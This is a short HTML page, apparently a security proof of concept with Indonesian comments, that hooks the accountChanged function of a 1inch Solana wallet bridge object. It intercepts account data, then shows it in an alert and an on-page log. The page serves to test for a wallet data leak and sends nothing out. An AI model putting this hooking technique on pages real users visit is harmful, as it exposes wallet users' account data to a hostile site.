<!DOCTYPE html>
<html>
<body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
    <h3>📡 Monitoring 1inch Events...</h3>
    <div id="logs">Menunggu event dari dompet (Coba ganti Network atau Akun di dompetmu)...</div>

    <script>
        const log = (m) => document.getElementById('logs').innerHTML += `<br>> ${m}`;
        const Bridge = window.OneInchSolanaWallet;

        if (Bridge) {
            // Kita coba "menempel" pada fungsi accountChanged atau chainChanged
            // yang kita temukan di tahap Deep Inspect tadi
            const originalAccountChanged = Bridge.accountChanged;
            
            Bridge.accountChanged = function(data) {
                alert("DATA TERBOCOR! Akun berubah: " + JSON.stringify(data));
                log("Intercepted Account: " + JSON.stringify(data));
                if(originalAccountChanged) originalAccountChanged.apply(this, arguments);
            };

            log("Monitoring aktif pada 'accountChanged'...");
        } else {
            log("Bridge tidak ditemukan.");
        }
    </script>
</body>
</html>
